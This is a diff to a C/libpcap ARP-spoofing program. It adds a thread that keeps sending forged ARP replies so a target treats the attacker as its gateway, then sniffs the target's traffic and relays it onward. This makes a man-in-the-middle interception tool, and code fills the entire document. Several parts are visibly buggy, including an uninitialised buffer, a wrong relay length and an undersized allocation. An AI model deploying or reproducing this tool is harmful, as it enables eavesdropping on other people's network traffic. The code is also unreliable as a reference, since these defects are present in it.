@@ -11,6 +11,8 @@
 #include <arpa/inet.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
+#include <pthread.h>
+#include <unistd.h>
 #include<netinet/ip_icmp.h>   //Provides declarations for icmp header
 //#include<netinet/udp.h>   //Provides declarations for udp header
 //#include<netinet/tcp.h>   //Provides declarations for tcp header
@@ -40,7 +42,33 @@ struct arp_header
     u_int8_t tha[6];      /* Target hardware address */
     struct in_addr tpa_inaddr; /* Target IP address       */
 };
-void GrapMyMacIP(char* myMac);
+struct thread_argv
+{
+    pcap_t *handle_t;
+    const u_int8_t *packet_t;
+};
+
+void* infect_sender(void* trd_argv){
+    //send packet
+    thread_argv* trd_p;
+    trd_p = (thread_argv*)trd_argv;
+    printf("THREADs...\n");
+    while(1){
+        if (pcap_sendpacket(trd_p->handle_t, trd_p->packet_t, 42 /* size */) != 0)
+        {
+            //fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(soc));
+            //return 0;
+            //printf("no\n");
+            sleep(1);
+        }
+        else{
+            //printf("ok\n");
+            //return NULL;
+            sleep(1);
+        }
+    }
+}
+
 
 int main(int argc, char *argv[])
 {
@@ -127,17 +155,17 @@ int main(int argc, char *argv[])
     packet = (u_int8_t*)malloc(sizeof(*Arp_req)+sizeof(*Eth_req));
 
     memcpy((void*)packet,Eth_req,14);//ETHERNET_SIZE);
-    memcpy((void*)packet+14,Arp_req,sizeof(*Arp_req)); // by address
+    memcpy((void*)packet+14,Arp_req, sizeof(*Arp_req)); // by address
 
     /* send packet */
     if (pcap_sendpacket(handle, packet, 42 /* size */) != 0)
     {
-        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr((pcap_t*)soc));
+        //fprintf(stderr,"\nError sending the packet: \n", pcap_geterr((pcap_t*)soc));
         return 0;
     }
     //free(Eth_req);
     //free(Arp_req);
-
+    printf("SEND PACKET\n");
     // ////////////////////RECEIVE ARP REPLY///////////////////////////
     // ///////////////////////////////////////////////////////////////
 
@@ -154,13 +182,13 @@ int main(int argc, char *argv[])
         Arp_rpy = (struct arp_header *)(packet + 14);
 
         /* check ARP? */
-        if(Eth_rpy->ether_type!=0x608 && Arp_rpy->oper!=512  )
+        if(Eth_rpy->ether_type!=0x608 && Arp_rpy->oper!=512 /*&& Arp_rpy -> */  )
         {
             printf("not ARP reply\n");
             continue;
             //fprintf(stderr, "-----------------------This is not ARP packet----------------------");
         }
-        printf("this : %s %s\n",&(Eth_rpy->ethernet_shost), &(Eth_req->ethernet_dhost));
+        printf("this : %s %s\n",Eth_rpy->ethernet_shost, &(Eth_req->ethernet_dhost));
 
         //arp requies
         if(strcmp((const char*)Eth_rpy->ethernet_shost, (const char*)Eth_req->ethernet_dhost))
@@ -171,13 +199,16 @@ int main(int argc, char *argv[])
         }
 
     }
+    printf("RECEIVED PACKET\n");
 
     // ////////////////////SEND ARP REPLY/////////////////////////////
     // /////target is going to recognize attacker as gateway//////////
 
+    //while (1){
     for (i = 0; i<6 ; i++){
-        Eth_req->ethernet_dhost[i] = Eth_rpy->ethernet_shost[i]; //@@ HERE @@
+        Eth_req->ethernet_dhost[i] = Eth_rpy->ethernet_shost[i]; //@@ HERE
     }
+
     Eth_req -> ether_type = 0x608;
     Arp_req -> htype = 256;
     Arp_req -> ptype = 8;
@@ -207,12 +238,17 @@ int main(int argc, char *argv[])
     memcpy((void*)packet,Eth_req,ETHERNET_SIZE);
     memcpy((void*)packet+14, Arp_req, sizeof(*Arp_req)); // by address
 
-    //send packet
-    if (pcap_sendpacket(handle, packet, 42 /* size */) != 0)
-    {
-        //fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(soc));
-        return 0;
-    }
+    //}
+    // send : make thread
+    pthread_t p_threads[1];
+    int trd_id;
+    struct thread_argv* trd_argv;
+    trd_argv = (thread_argv*)malloc(sizeof(thread_argv*));
+    trd_argv->handle_t = handle;
+    trd_argv->packet_t = packet;
+    trd_id = pthread_create(&p_threads[0], NULL, infect_sender, (void*)trd_argv);
+    //sleep(1);
+
     //free(Eth_req);
     //free(Arp_req);
     //free(Eth_rpy);
@@ -223,59 +259,119 @@ int main(int argc, char *argv[])
     // ///////////////////////////////////////////////////////////////
 
     // sniffed  = destination IP is not itself.
-    struct icmphdr *icmp_header;
-    struct iphdr *ip_header;
-    struct ethernet_header *eth_header;
-    const u_char * sniffed_pk;
+    struct iphdr *Iph_spf;
+    struct ethernet_header *Eth_spf;
+    const u_char* sniffed_pk;
 
-    eth_header = (struct ethernet_header*)malloc(sizeof(struct ethernet_header));
-    ip_header = (struct iphdr*)malloc(sizeof(struct iphdr));
-    icmp_header = (struct icmphdr*)malloc(sizeof(struct icmphdr));
+    //newly malloc
+    Eth_spf = (struct ethernet_header*)malloc(sizeof(struct ethernet_header));
+    Iph_spf = (struct iphdr*)malloc(sizeof(struct iphdr));
+    // no need to check ICMP
 
     printf("received a sniffed packet\n");
+
+
     while(1){ //double pointer
         res = pcap_next_ex(handle, &header, &sniffed_pk);
         if(res==0) {continue;}
 
         /* parse sniffed packet */
-        eth_header = (struct ethernet_header*)sniffed_pk;
-        ip_header = (struct iphdr *)(sniffed_pk + sizeof(struct ethernet_header));
-        icmp_header = (struct icmphdr *)(sniffed_pk + sizeof(struct ethernet_header) + sizeof(struct iphdr));
+        Eth_spf = (struct ethernet_header*)sniffed_pk;
+        Iph_spf = (struct iphdr *)(sniffed_pk + sizeof(struct ethernet_header));
 
-        /* check icmp */
-        if(eth_header->ether_type!=0x8 && ip_header->protocol != 1) //icmp
-        {
-            printf("NOT ICMP\n");
+        printf("%d %d\n",Iph_spf->daddr, attackerIP.s_addr);
+
+        /* SNIFFED = destination IP is not itself */
+        if(Iph_spf->daddr == attackerIP.s_addr){
             continue;
         }
-        else {
-            printf("ICMP\n");
+        else{
+            printf("sniffed\n");
 
-            /* SNIFFED = destination IP is not itself */
-            if(!strcmp((const char*)&(ip_header->daddr), (const char*)&(attackerIP.s_addr))){
-                printf("AA : %s , %s\n", (const char*)&(ip_header->daddr), (const char*)&(attackerIP.s_addr));
-                continue;
+            // ////////////////////RELAY THE SNIFFED PACKET///////////////////
+            // ///////////////////////////////////////////////////////////////
+
+            /* gateway mac */
+            // /////////////////////gateway ARP requies ///////////////////
+            const u_char * packet1;
+            for( i = 0 ; i < 6 ; ++i)
+            {
+                Arp_req -> sha[i] = mac_address[i] ;
+                Eth_req -> ethernet_shost[i] = mac_address[i] ;
+                Arp_req -> tha[i] = 0;
+            }
+            inet_pton(AF_INET, argv[2], &(ttargetIP)); //Arp_req -> tpa_inaddr.s_addr);
+            Arp_req->tpa_inaddr = ttargetIP;
+
+            /* packet */
+            for (i = 0; i<6 ; i++){
+                Eth_req->ethernet_dhost[i] = 0xff;
+            }
+            Eth_req -> ether_type = 0x608;
+            Arp_req -> htype = 256;
+            Arp_req -> ptype = 8;
+            Arp_req -> hlen = '\x06';
+            Arp_req -> plen = '\x04';
+            Arp_req -> oper = 256;
+
+            //connect two structure
+            packet = (u_int8_t*)malloc(sizeof(*Arp_req)+sizeof(*Eth_req));
+
+            memcpy((void*)packet1,Eth_req,14);//ETHERNET_SIZE);
+            memcpy((void*)packet1+14,Arp_req, sizeof(*Arp_req)); // by address
+
+            /* send packet */
+            if (pcap_sendpacket(handle, packet1, 42 /* size */) != 0)
+            {
+                return 0;
+            }
+            // /////////////////gateway ARP reply receive//////////////////////////
+            const u_char* packet2;
+            while(1){ //double pointer
+                res = pcap_next_ex(handle, &header, &packet2);
+                if(res==0) {continue;}
+
+                /* calc size of ARP heaer */
+                Eth_rpy = (struct ethernet_header *)packet2;
+                Arp_rpy = (struct arp_header *)(packet2 + 14);
+
+                /* check ARP? */
+                if(Eth_rpy->ether_type!=0x608 && Arp_rpy->oper!=512 /*&& Arp_rpy -> */  )
+                {
+                    printf("not ARP reply\n");
+                    continue;
+                }
+
+                /* if srcIP is what I was waiting for -> break */
+                if(Arp_rpy->spa_inaddr.s_addr==Arp_req->tpa_inaddr.s_addr)
+                {
+                    printf("MAC : %x \n",&(Arp_rpy -> sha));
+                    printf("-----------\n");
+                    break;
+                }
+
+            }
+            printf("RECEIVED PACKET\n");
+
+            // //////////////////RELAY////////////////
+            /*CHANGE MAC */
+            for (i=0; i<6; i++){
+                Eth_spf -> ethernet_shost[i] = mac_address[i];
+                Eth_spf -> ethernet_dhost[i] = Eth_rpy -> ethernet_shost[i]; // this is gateway MAC
+            }
+            if (pcap_sendpacket(handle, sniffed_pk, sizeof(*sniffed_pk)/* size */) != 0)
+            {
+                printf("RELAY_fail\n");
             }
             else{
-                printf("sniffed");
-                break;
+                printf("RELAYed\n");
             }
+
+            printf("------");
+
         }
+        sleep(1);
     }
-
-    // ////////////////////RELAY THE SNIFFED PACKET///////////////////
-    // ///////////////////////////////////////////////////////////////
-    for (i=0; i<6; i++){
-    eth_header -> ethernet_shost[i] = mac_address[i];
-    }
-    //ip_header -> saddr = mac_address; //QQQ where is port number eth? ip?
-    if (pcap_sendpacket(handle, sniffed_pk, 42 /* size */) != 0)
-    {
-        printf("fail\n");
-        //fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(soc));
-        return 0;
-    }
-
 
 
     // ////////////////////RECEIVE ARP REPLY//////////////////////////
@@ -289,3 +385,4 @@ int main(int argc, char *argv[])
     return(0);
     //}
 }
+
